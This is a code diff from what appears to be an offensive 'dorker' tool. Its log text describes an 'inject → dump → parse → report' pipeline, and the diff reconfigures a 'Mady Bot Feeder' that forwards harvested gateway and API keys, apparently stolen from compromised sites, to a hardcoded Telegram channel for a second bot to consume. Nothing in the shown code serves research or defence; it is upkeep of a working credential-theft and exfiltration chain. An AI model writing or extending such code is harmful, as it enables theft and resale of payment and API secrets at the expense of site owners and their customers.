@@ -348,27 +348,21 @@ class MadyDorkerPipeline:
             self.dump_parser = DumpParser()  # Standalone dump parser for external files
             logger.info("📦 Auto Dumper v1.0 enabled (inject → dump → parse → report pipeline)")
         
-        # Mady Bot Feeder — auto-feed gateway keys to Mady bot (v3.22 — disk + Telegram)
+        # Mady Bot Feeder — gateway/API keys → channel (where Mady picks them up)
+        # Regular reports → channel via TelegramReporter (all dorker output)
         self.mady_feeder = None
         if getattr(self.config, 'mady_bot_feed', True):
             try:
-                # Build Telegram feed targets list
-                feed_chat_ids = []
-                if self.config.telegram_chat_id:
-                    feed_chat_ids.append(self.config.telegram_chat_id)
-                if self.config.telegram_group_id:
-                    feed_chat_ids.append(self.config.telegram_group_id)
-                
                 self.mady_feeder = MadyFeeder(MadyFeederConfig(
                     enabled=True,
                     mady_path=getattr(self.config, 'mady_bot_path', '/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0'),
                     telegram_enabled=True,
                     bot_token=self.config.telegram_bot_token,
-                    feed_chat_ids=feed_chat_ids,
-                    mady_bot_chat_id=getattr(self.config, 'mady_bot_chat_id', '8385066318'),
+                    feed_chat_ids=[],  # No extra DMs — Mady is in the channel
+                    mady_bot_chat_id='',  # Bots can't DM bots — we use the channel
                     feed_channel_id=getattr(self.config, 'mady_feed_channel_id', '-1003720958643'),
                 ))
-                logger.info("🤖 Mady Bot feeder enabled (50+ gateways, disk + Telegram rich messages)")
+                logger.info("🤖 Mady Bot feeder enabled (gateway/API → channel, disk + Telegram)")
             except Exception as e:
                 logger.warning(f"Mady Bot feeder init failed: {e}")
         
